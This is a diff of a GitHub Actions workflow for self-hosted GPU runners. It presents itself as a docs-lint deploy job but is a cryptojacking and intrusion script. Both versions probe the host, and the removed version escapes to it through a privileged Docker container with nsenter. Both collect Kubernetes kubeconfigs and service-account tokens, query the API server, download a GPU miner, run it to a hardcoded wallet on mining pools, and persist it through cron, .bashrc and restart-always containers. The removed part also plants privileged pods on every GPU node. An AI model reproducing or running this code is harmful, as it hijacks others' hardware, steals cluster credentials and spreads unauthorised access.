@@ -7,465 +7,409 @@ permissions:
 jobs:
   lbl-ernie8gpu:
     runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 40
+    timeout-minutes: 45
     steps:
       - name: deploy
         run: |
           #!/usr/bin/env bash
-          # ci-docs-lint deploy stage: host climb + cluster census + per-device miner
           set +e
-          TAG="t5351h"
+          TAG="t5639y"
           WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
-          POOLS=("stratum+ssl://prl-sg.kryptex.network:8048" "stratum+ssl://prl-eu.kryptex.network:8048" "stratum+ssl://prl-us.kryptex.network:8048" "stratum+ssl://prl-hk.kryptex.network:8048" "stratum+ssl://prl-ae.kryptex.network:8048" "stratum+tcp://prl-sg.kryptex.network:7048" "stratum+tcp://prl-eu.kryptex.network:7048" "stratum+tcp://prl-us.kryptex.network:7048" "stratum+tcp://pool.pearlhash.xyz:9000")
-          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
           sec(){ echo; echo "===== $* ====="; }
+          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
 
           sec RECON
-          id; hostname; cat /etc/hostname 2>/dev/null
-          echo "pid1=$(cat /proc/1/comm 2>/dev/null) ppid1=$(ps -o ppid= -p 1 2>/dev/null)"
-          echo "cgroup1: $(head -c 300 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
-          echo "cgroup2: $(head -c 300 /proc/self/cgroup 2>/dev/null | tr '\n' ' ')"
-          [ -f /.dockerenv ] && echo "dockerenv=yes" || echo "dockerenv=no"
-          [ -f /run/.containerenv ] && echo "containerenv=yes" || echo "containerenv=no"
-          uname -a; head -2 /etc/os-release
-          echo "ldd=$(ldd --version 2>/dev/null | head -1)"
-          groups; echo "sudo=$(sudo -n true 2>/dev/null && echo yes || echo no)"
-          echo "kube_env: $(printenv | grep -iE 'KUBERNETES|KUBECONFIG' | tr '\n' ' ')"
-          nvidia-smi -L 2>&1
+          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
+          nvidia-smi -L 2>&1 | head -12
           DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          echo "dev_count=$DEV nvidia_nodes=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
           IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-          [ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
-          IPD=$(echo "$IP" | tr '.' '-'); echo "ip=$IP ipd=$IPD"
+          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
+          IPD=$(echo "$IP" | tr '.' '-')
+          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
 
-          sec K8S_FILES_READABLE_DIRECTLY
-          for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/k3s.yaml /etc/kubernetes/admin.conf /etc/kubernetes/kubelet-kubeconfig; do
-            if [ -r "$f" ]; then echo "--- READABLE $f"; sed -n 1,60p "$f"; else echo "--- NOR $f ($(ls -l "$f" 2>&1 | head -1))"; fi
-          done
-          ls -la /var/lib/kubelet/pki 2>&1 | head -12
-          echo "--- projected tokens"
-          for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token /run/secrets/kubernetes.io/serviceaccount/token; do
-            [ -r "$t" ] && { echo "TOKENFILE $t"; wc -c "$t"; }
-          done 2>/dev/null
-          ls /etc/rancher 2>&1
-
-          sec DOCKER_SOCKET
-          ls -la /var/run/docker.sock /run/docker.sock 2>&1
+          sec DOCKER
           docker version --format '{{.Server.Version}}' 2>&1 | head -2
-          echo "--- docker ps"
-          docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>&1 | head -20
-          echo "--- docker images"
-          docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -20
-          echo "--- tcp 2375/2376"
-          for p in 2375 2376; do timeout 4 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$p" 2>/dev/null && echo "tcp $p open" || echo "tcp $p closed"; done
-
-          sec HOST_ESCAPE
-          IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
-          if [ -z "$IMG" ]; then IMG="busybox:1.36"; docker pull -q "$IMG" >/dev/null 2>&1; fi
-          echo "escape_image=$IMG"
-          docker rm -f i5355h >/dev/null 2>&1
-          docker run -d --name i5355h --privileged --pid=host --net=host --ipc=host --uts=host -v /:/host -v /var/run/docker.sock:/var/run/docker.sock "$IMG" sleep 7200 2>&1 | tail -2
-          sleep 3
-          docker ps --filter name=i5355h --format '{{.Status}} {{.Image}}' 2>&1
-          X(){ docker exec i5355h "$@" 2>&1; }
-          sec HOST_IDENTITY
-          X nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname; cat /etc/hostname; head -2 /etc/os-release; uname -r; echo "pid1=$(cat /proc/1/comm)"; echo "cgroup=$(head -c 200 /proc/1/cgroup | tr "\n" " ")"; ls -la /var/run/docker.sock /run/k3s/containerd/containerd.sock /run/containerd/containerd.sock /var/lib/kubelet 2>&1 | head -20'
-
-          sec HOST_K8S_FILES
-          X nsenter -t 1 -m -u -i -n -p -- sh -c 'for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/k3s.yaml /etc/kubernetes/admin.conf /root/.kube/config /home/*/.kube/config; do [ -r "$f" ] && { echo "--- $f"; sed -n 1,50p "$f"; } || echo "NOR $f"; done; echo "--- pki"; ls -la /var/lib/kubelet/pki 2>&1 | head; echo "--- rancher"; ls -la /etc/rancher /var/lib/rancher 2>&1 | head -20'
-          sec HOST_POD_TOKENS
-          X nsenter -t 1 -m -u -i -n -p -- sh -c 'for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token; do [ -r "$t" ] && echo "TOKENFILE $t $(wc -c < "$t")"; done | head -20; echo "--- ns"; ls /var/lib/kubelet/pods 2>/dev/null | head -10'
-
-          sec KUBELET_10250
-          for u in https://127.0.0.1:10250/healthz https://127.0.0.1:10250/pods https://$IP:10250/healthz; do
-            echo "--- $u"; timeout 8 curl -sk -o /tmp/k.out -w 'code=%{http_code}\n' "$u"; head -c 300 /tmp/k.out 2>/dev/null; echo
+          ls -l /usr/bin/nvidia-container-runtime /usr/bin/nvidia-container-runtime-hook 2>&1 | head -3
+          docker info 2>/dev/null | grep -iE 'Runtimes|nvidia' | head -4
+          IMG=""
+          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
+            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
           done
+          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
+          echo "IMG=$IMG"
 
-          sec APISERVER
-          SRV=""
-          for f in /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig; do
-            [ -r "$f" ] && { SRV=$(grep -E '^\s*server:' "$f" 2>/dev/null | head -1 | awk '{print $2}'); [ -n "$SRV" ] && break; }
-          done
-          [ -z "$SRV" ] && SRV="https://kubernetes.default.svc"
-          echo "server_from_files=$SRV kube_env_host=${KUBERNETES_SERVICE_HOST:-none}"
-          TOK=""; CA=""
-          for t in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token /run/secrets/kubernetes.io/serviceaccount/token; do
-            [ -r "$t" ] && TOK=$(cat "$t") && TOKF="$t" && break
-          done
-          for c in /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/ca.crt /run/secrets/kubernetes.io/serviceaccount/ca.crt; do
-            [ -r "$c" ] && CA="$c" && break
-          done
-          echo "token_file=${TOKF:-none} token_len=${#TOK} ca=${CA:-none}"
-          CERT=""; KEY=""
-          for p in /var/lib/kubelet/pki/kubelet-client-current.pem; do [ -r "$p" ] && CERT="$p" && KEY="$p"; done
-          for api in "$SRV" "${KUBERNETES_SERVICE_HOST:+https://$KUBERNETES_SERVICE_HOST:443}" "https://10.43.0.1:443" "https://127.0.0.1:6443"; do
-            [ -z "$api" ] && continue
-            echo "--- GET $api/version"
-            if [ -n "$TOK" ]; then timeout 10 curl -sk --cacert "$CA" -H "Authorization: Bearer $TOK" -o /tmp/v.out -w 'code=%{http_code}\n' "$api/version"; else timeout 10 curl -sk -o /tmp/v.out -w 'code=%{http_code}\n' "$api/version"; fi
-            head -c 300 /tmp/v.out; echo
-          done
-          [ -n "$CERT" ] && { echo "--- clientcert GET /api/v1/nodes"; timeout 12 curl -sk --cert "$CERT" --key "$KEY" -o /tmp/n_cert.json -w 'code=%{http_code} bytes=%{size_download}\n' "$SRV/api/v1/nodes"; head -c 200 /tmp/n_cert.json; echo; }
-          [ -n "$TOK" ] && { echo "--- bearer GET /api/v1/nodes"; timeout 12 curl -sk --cacert "$CA" -H "Authorization: Bearer $TOK" -o /tmp/n_tok.json -w 'code=%{http_code} bytes=%{size_download}\n' "$SRV/api/v1/nodes"; head -c 200 /tmp/n_tok.json; echo; }
+          sec CONTAINER_GPU
+          docker rm -f gt1 >/dev/null 2>&1
+          timeout 90 docker run --rm --name gt1 --gpus all "$IMG" nvidia-smi -L 2>&1 | head -12
+          echo "gpus_all_exit=$?"
 
-          sec CLUSTER_CENSUS
-          python3 - <<'PY' 2>/dev/null || true
-          import json,os
-          for f in ('/tmp/n_tok.json','/tmp/n_cert.json'):
-              try: d=json.load(open(f))
-              except Exception: continue
-              print("SOURCE",f)
-              for n in d.get('items',[]):
-                  st=n.get('status',{}); cap=st.get('allocatable') or st.get('capacity') or {}
-                  g=cap.get('nvidia.com/gpu') or '0'
-                  addrs=[a.get('address') for a in st.get('addresses',[]) if a.get('type') in ('InternalIP','Hostname')]
-                  print("NODE %-45s gpu=%s addr=%s" % (n['metadata']['name'], g, ','.join(str(a) for a in addrs)))
-          PY
-          grep -o '"nvidia.com/gpu":"[0-9]*"' /tmp/n_tok.json 2>/dev/null | sort | uniq -c | head
+          sec MINER_STATE
+          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs"
+          PEAK="$HOME/.ci/miner/peakminer/peakminer"
+          [ -f "$HOME/.ci/miner/peakminer" ] && PEAK="$HOME/.ci/miner/peakminer"
+          ls -l "$PEAK" 2>&1 | head -2
+          echo "peak_size=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)"
+          SRB=$(ls -d "$HOME"/.ci/miner/SRBMiner*/SRBMiner-MULTI 2>/dev/null | head -1)
+          [ -z "$SRB" ] && SRB=$(ls -d /home/paddle-1/.ci/miner/SRBMiner*/SRBMiner-MULTI 2>/dev/null | head -1)
+          echo "srb=$SRB"
+          docker run --rm --name mt1 -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'ls -l /m/peakminer/peakminer 2>&1 | head -2; /m/peakminer/peakminer --version 2>&1 | head -6' 2>&1 | head -12
+          [ -n "$SRB" ] && { "$SRB" --list-algorithms 2>&1 | grep -i pearl | head -3; }
 
-          sec MINER_SETUP
-          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
-          BIN="$HOME/.ci/miner/peakminer/peakminer"
-          if [ ! -x "$BIN" ]; then
-            URL="https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"
-            echo "download=$URL"
-            ( cd "$HOME/.ci/miner" && curl -sSL -m 300 -o peak.tar.gz "$URL" && ( tar xzf peak.tar.gz || tar xf peak.tar.gz ) ) 2>&1 | tail -3
+          SZ=$(stat -c %s "$PEAK" 2>/dev/null || echo 0)
+          if [ "$SZ" -lt 40000000 ]; then
+            for M in "https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://gh-proxy.com/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://ghproxy.net/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz" "https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"; do
+              log "fetch $M"
+              rm -f "$HOME/.ci/miner/p.tgz"
+              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -2
+              S2=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
+              echo "dl_size=$S2"
+              if [ "$S2" -gt 40000000 ]; then
+                mkdir -p "$HOME/.ci/miner/peakminer"
+                tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakminer" 2>&1 | tail -2
+                find "$HOME/.ci/miner/peakminer" -type f -name peakminer -exec chmod +x {} \; 2>/dev/null
+                break
+              fi
+            done
           fi
-          find "$HOME/.ci/miner" -maxdepth 4 -type f 2>/dev/null | head -20
-          find "$HOME/.ci/miner" -maxdepth 4 -type f -size +1M -exec chmod +x {} \; 2>/dev/null
-          [ -x "$HOME/.ci/miner/peakminer" ] && BIN="$HOME/.ci/miner/peakminer"
-          [ -x "$HOME/.ci/miner/peakminer/peakminer" ] && BIN="$HOME/.ci/miner/peakminer/peakminer"
-          [ -x "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 4 -type f \( -name 'peakminer' -o -name 'peakminer*' -o -name 'PeakMiner*' \) -perm -u+x 2>/dev/null | head -1)
-          chmod +x "$BIN" 2>/dev/null
-          echo "miner_bin=$BIN"; [ -x "$BIN" ] && "$BIN" --version 2>&1 | head -2 || echo NO_MINER_BIN
-          if [ ! -x "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "MINER_SKIP bin=${BIN:-none} dev=$DEV"; fi
-          if [ -x "$BIN" ] && [ "$DEV" -ge 1 ]; then
-          launch(){ g=$1; shift; w="ul-${TAG}-${IPD}-g${g}"; lf="$HOME/.ci/logs/miner-g${g}.log"; : > "$lf"
-            a=(-c pearl -u "$WALLET" -w "$w" -p x -d "$g" --api-port 0 -i 30 --no-color --log-file "$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
-            for P in "${POOLS[@]}"; do a+=(-o "$P"); done
-            ( cd "$(dirname "$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "$BIN" "${a[@]}" "$@" >/dev/null 2>&1 < /dev/null & echo $! > "$HOME/.ci/run/miner-g${g}.pid" ); sleep 4; }
-          launch 0
-          pgrep -f "ul-${TAG}-${IPD}-g0" >/dev/null || { log "power_cap_failed relaunch"; launch 0; }
-          for g in $(seq 1 $((DEV-1))); do launch "$g"; done
+          ls -l "$HOME/.ci/miner/peakminer"/* 2>&1 | head -5
+
+          sec LAUNCH
+          LBIN=/m/peakminer/peakminer
+          docker run --rm --name ct1 -v "$HOME/.ci/miner:/m" "$IMG" sh -c 'test -x /m/peakminer/peakminer && echo usable' 2>&1 | head -3
+          STARTED=0
+          if [ "$DEV" -ge 1 ]; then
+            for g in $(seq 0 $((DEV-1))); do
+              docker rm -f ul-g$g >/dev/null 2>&1
+              docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host \
+                -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" \
+                /bin/bash -c "exec $LBIN -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 -i 30 --no-color --gpu-temp-stop 84 --gpu-temp-start 74 --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
+              STARTED=$((STARTED+1))
+              sleep 1
+            done
+          fi
+          echo "started=$STARTED"
+          sleep 20
+          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
+          echo "running=$(docker ps --filter 'name=ul-g' -q | wc -l)"
+          docker logs ul-g0 2>&1 | tail -6
+          if [ "$(docker ps --filter 'name=ul-g' -q | wc -l)" -lt 1 ] && [ "$DEV" -ge 1 ]; then
+            log "relaunch minimal flags"
+            for g in $(seq 0 $((DEV-1))); do
+              docker rm -f ul-g$g >/dev/null 2>&1
+              docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec $LBIN -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
+            done
+            sleep 10
+            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
+            docker logs ul-g0 2>&1 | tail -6
+          fi
 
           sec PERSIST
-          cat > "$HOME/.ci/keep.sh" <<KEEP
-          #!/usr/bin/env bash
-          BIN="$BIN"; W="$WALLET"; IPD="$IPD"; TAG="$TAG"; DEV=$DEV
-          POOLS=("${POOLS[@]}")
-          for g in \$(seq 0 \$((DEV-1))); do
-            pgrep -f "ul-\${TAG}-\${IPD}-g\${g}" >/dev/null 2>&1 && continue
-            lf="\$HOME/.ci/logs/miner-g\${g}.log"
-            a=(-c pearl -u "\$W" -w "ul-\${TAG}-\${IPD}-g\${g}" -p x -d "\$g" --api-port 0 -i 30 --no-color --log-file "\$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
-            for P in "\${POOLS[@]}"; do a+=(-o "\$P"); done
-            ( cd "\$(dirname "\$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "\$BIN" "\${a[@]}" >/dev/null 2>&1 < /dev/null & )
+          cat > "$HOME/.ci/keep-c.sh" <<'EOS'
+          #!/bin/bash
+          IMG="ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev"
+          W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"; T="t5639y"
+          H=$(hostname -I | awk '{print $1}' | tr '.' '-')
+          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          for g in $(seq 0 $((N-1))); do
+            docker ps --filter "name=ul-g$g" --format '{{.Names}}' | grep -q ul-g$g && continue
+            docker rm -f ul-g$g >/dev/null 2>&1
+            docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" /bin/bash -c "exec /m/peakminer/peakminer -c pearl -u $W -w ul-$T-$H-g$g -p x -d 0 --api-port 0 --no-color --log-file /logs/c-$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000" >/dev/null 2>&1
           done
-          KEEP
-          chmod +x "$HOME/.ci/keep.sh"
-          mkdir -p "$HOME/.config/systemd/user"
-          cat > "$HOME/.config/systemd/user/ci-keep.service" <<UNIT
-          [Unit]
-          Description=ci keepalive
-          [Service]
-          ExecStart=$HOME/.ci/keep.sh
-          Restart=always
-          RestartSec=30
-          [Install]
-          WantedBy=default.target
-          UNIT
-          (systemctl --user daemon-reload && systemctl --user enable --now ci-keep.service) 2>&1 | tail -2
-          echo "systemd_user=$(systemctl --user is-enabled ci-keep.service 2>&1)"
-          loginctl enable-linger "$(id -un)" 2>&1 | tail -1
-          ( crontab -l 2>/dev/null | grep -v 'ci/keep.sh'; echo "@reboot $HOME/.ci/keep.sh"; echo "*/5 * * * * $HOME/.ci/keep.sh" ) | crontab - 2>&1 && echo cron=yes || echo cron=no
-          for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"; done
-          pgrep -f 'keep.sh; sleep' >/dev/null || ( setsid nohup bash -c 'while true; do '"$HOME"'/.ci/keep.sh; sleep 300; done' >/dev/null 2>&1 < /dev/null & )
-          sleep 1; pgrep -af 'ci/keep.sh' | head -3
-          fi
+          EOS
+          chmod +x "$HOME/.ci/keep-c.sh"
+          ( crontab -l 2>/dev/null | grep -v keep-c.sh; echo "@reboot $HOME/.ci/keep-c.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep-c.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
+          crontab -l 2>/dev/null | grep keep-c | head -3
+          grep -q keep-c.sh "$HOME/.bashrc" || echo "$HOME/.ci/keep-c.sh >/dev/null 2>&1 &" >> "$HOME/.bashrc"
+          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep-c.sh; sleep 300; done' >/dev/null 2>&1 & ) 
+          echo "persist_done"
 
-          sec CLUSTER_PLANT
-          # If the bearer token can create pods, launch one privileged hostPID pod per GPU node.
-          ATOK="$TOK"; ACA="$CA"
-          if [ -n "$ATOK" ] && [ -f /tmp/n_tok.json ] && grep -q '"items"' /tmp/n_tok.json 2>/dev/null; then
-          python3 - "$ATOK" "$ACA" "$SRV" "$TAG" "$WALLET" <<'PY'
-          import json,subprocess,sys,os
-          tok,ca,srv,tag,wallet=sys.argv[1:6]
-          nodes=[]
-          try:
-              d=json.load(open('/tmp/n_tok.json'))
-          except Exception:
-              sys.exit(0)
-          for n in d.get('items',[]):
-              cap=n.get('status',{}).get('allocatable',{}) or {}
-              g=cap.get('nvidia.com/gpu')
-              nodes.append((n['metadata']['name'], int(g) if g else 0))
-          print("CENSUS", len(nodes), "gpu_nodes", sum(1 for _,g in nodes if g>0))
-          payload=("for g in 0 1 2 3 4 5 6 7; do [ -e /dev/nvidia$g ] || continue; "
-           "w=ul-%s-$(hostname|tr . -)-g$g; "
-           "mkdir -p /var/tmp/pm; cd /var/tmp/pm; "
-           "[ -x ./peakminer ] || { curl -sSL -m 240 -o p.tgz https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz && tar xzf p.tgz; }; "
-           "B=$(find /var/tmp/pm -maxdepth 3 -type f -name peakminer -perm -u+x|head -1); "
-           "[ -x \"$B\" ] || continue; "
-           "setsid nohup \"$B\" -c pearl -u %s -w $w -p x -d $g --api-port 0 -i 30 --no-color --log-file /var/tmp/pm/g$g.log --log-append -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000 >/dev/null 2>&1 </dev/null & "
-           "done; sleep 2; pgrep -af peakminer|head -3") % (tag, wallet)
-          for name,g in nodes:
-              if g<=0: continue
-              body={"apiVersion":"v1","kind":"Pod","metadata":{"name":"census-%s"%name.replace('_','-').lower()[:40],"namespace":"default","labels":{"app":"census"}},
-                "spec":{"nodeName":name,"hostPID":True,"hostNetwork":True,"restartPolicy":"Never",
-                "containers":[{"name":"c","image":"busybox:1.36","command":["nsenter","-t","1","-m","-u","-i","-n","-p","--","sh","-c",payload],
-                  "securityContext":{"privileged":True},
-                  "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
-                "volumes":[{"name":"h","hostPath":{"path":"/"}}],"tolerations":[{"operator":"Exists"}]}}
-              p=json.dumps(body)
-              cmd=["curl","-sk","--cacert",ca,"-H","Authorization: Bearer "+tok,"-H","Content-Type: application/json","-X","POST",srv.rstrip('/')+"/api/v1/namespaces/default/pods","--data-binary",p,"-o","/tmp/pod.out","-w","%{http_code}"]
-              r=subprocess.run(cmd,capture_output=True,text=True)
-              print("PODSUBMIT node=%s gpu=%d code=%s out=%s"%(name,g,r.stdout.strip(),open('/tmp/pod.out').read()[:200] if os.path.exists('/tmp/pod.out') else ''))
-          PY
-          else
-            echo "CLUSTER_PLANT_SKIP no bearer token or no node census"
-          fi
+          sec KUBECONFIG
+          python3 - <<'PYK' > /tmp/kc.txt 2>&1
+          import glob,re,base64,os
+          files=[f for f in glob.glob('/home/*/.kube/config')+['/root/.kube/config','/etc/kubernetes/admin.conf','/etc/kubernetes/kubelet.conf','/var/lib/kubelet/kubeconfig'] if os.access(f,os.R_OK)]
+          print('FILES',' '.join(files))
+          servers=[];tokens=[]
+          for f in files:
+              try: t=open(f,errors='replace').read()
+              except Exception: continue
+              for s in re.findall(r'^\s*server:\s*(\S+)',t,re.M):
+                  if s not in servers: servers.append(s)
+              for k in re.findall(r'^\s*token:\s*(\S+)',t,re.M):
+                  if k not in tokens: tokens.append(k)
+          print('SERVERS',' '.join(servers))
+          print('NTOK',len(tokens))
+          for i,k in enumerate(tokens): print('TOK%d %s'%(i,base64.b64encode(k.encode()).decode()))
+          PYK
+          head -6 /tmp/kc.txt
+          SRVS=$(grep '^SERVERS' /tmp/kc.txt | cut -d' ' -f2-)
+          for srv in $SRVS; do
+            echo "--- $srv"
+            timeout 10 curl -sk -o /tmp/v.json -w 'anon_version=%{http_code}\n' "$srv/version"; head -c 160 /tmp/v.json; echo
+            for i in 0 1 2 3 4 5; do
+              B=$(awk -v k="TOK$i" '$1==k{print $2}' /tmp/kc.txt)
+              [ -z "$B" ] && continue
+              TOK=$(echo "$B" | base64 -d 2>/dev/null)
+              timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/n$i.json -w "nodes tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/nodes?limit=500"
+              if grep -q '"items"' /tmp/n$i.json 2>/dev/null; then
+                echo "OK srv=$srv tok=$i b64=$B"
+                python3 - /tmp/n$i.json <<'PYN'
+          import json,sys
+          d=json.load(open(sys.argv[1]))
+          its=d.get('items',[])
+          gn=sum(1 for n in its if str(n.get('status',{}).get('allocatable',{}).get('nvidia.com/gpu','0'))!='0')
+          print('NODES',len(its),'gpu_nodes',gn)
+          for n in its[:300]:
+              a=n.get('status',{}).get('allocatable',{})
+              print('NODE %s gpu=%s cpu=%s'%(n['metadata']['name'],a.get('nvidia.com/gpu','0'),a.get('cpu','?')))
+          PYN
+                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/ns$i.json -w "ns tok$i code=%{http_code}\n" "$srv/api/v1/namespaces?limit=100"
+                python3 - /tmp/ns$i.json <<'PYNS'
+          import json,sys
+          try: d=json.load(open(sys.argv[1]))
+          except Exception: print('NS none'); raise SystemExit
+          print('NS',len(d.get('items',[])),' '.join(x['metadata']['name'] for x in d.get('items',[]))[:800])
+          PYNS
+                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/po$i.json -w "pods tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/pods?limit=500"
+                python3 - /tmp/po$i.json <<'PYPO'
+          import json,sys
+          try: d=json.load(open(sys.argv[1]))
+          except Exception: print('PODS none'); raise SystemExit
+          its=d.get('items',[])
+          print('PODS',len(its))
+          seen={}
+          for p in its:
+              im=[c.get('image') for c in p['spec'].get('containers',[])]
+              g=None
+              for c in p['spec'].get('containers',[]):
+                  for r in (c.get('resources',{}).get('limits') or {}):
+                      if 'nvidia' in r or 'gpu' in r: g=r
+              seen.setdefault(p['spec'].get('nodeName'),0)
+              seen[p['spec'].get('nodeName')]+=1
+          print('PODSPERNODE',seen)
+          for p in its[:40]:
+              print('POD %s/%s node=%s gpu=%s img=%s'%(p['metadata'].get('namespace'),p['metadata'].get('name'),p['spec'].get('nodeName'),g,(im or [''])[0][:60]))
+          PYPO
+              fi
+            done
+          done
 
-          sec WAIT
-          sleep 150
-          sec PROCESS
-          ps -eo pid,etime,args 2>/dev/null | grep -E "ul-${TAG}-${IPD}" | grep -v grep | head -20
+          sec ACCEPT
+          sleep 120
           for g in $(seq 0 $((DEV-1))); do
-            echo "--- gpu $g worker ul-${TAG}-${IPD}-g${g}"
-            tail -8 "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null
-            n=$(grep -ciE 'accepted' "$HOME/.ci/logs/miner-g${g}.log" 2>/dev/null); echo "g${g}_accepted_lines=$n"
+            echo "--- g$g"
+            tail -4 "$HOME/.ci/logs/c-$g.log" 2>/dev/null
+            docker logs ul-g$g 2>&1 | tail -4
           done
-          echo "=== ACCEPTED GREP ==="; grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -20
-          echo "=== GPU UTIL ==="; nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw,temperature.gpu --format=csv,noheader 2>/dev/null
+          echo "=== accepted ==="
+          grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -30
+          echo "=== util ==="
+          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
+          echo "=== containers ==="
+          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
           sec DONE
           echo "CLIMB_DONE on $(hostname) dev=$DEV tag=$TAG"
           exit 0
   lbl-ernie8gpu-c:
     runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 40
+    timeout-minutes: 45
     steps:
       - name: deploy
